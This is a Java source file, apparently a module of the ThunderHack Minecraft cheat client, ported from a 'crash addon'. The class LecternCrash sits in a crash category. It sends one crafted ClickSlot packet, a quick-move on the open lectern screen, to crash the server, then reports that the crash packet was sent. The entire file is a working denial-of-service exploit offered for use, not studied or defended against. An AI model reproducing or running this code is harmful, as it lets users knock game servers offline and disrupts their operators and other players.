// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import thunder.hack.features.modules.Module;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class LecternCrash extends Module {
    private boolean sent = false;

    public LecternCrash() {
        super("LecternCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;
        mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
            mc.player.currentScreenHandler.syncId,
            mc.player.currentScreenHandler.getRevision(),
            0, 0, SlotActionType.QUICK_MOVE,
            mc.player.currentScreenHandler.getCursorStack().copy(),
            Int2ObjectMaps.emptyMap()));
        sendMessage("Lectern crash packet sent");
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }
}
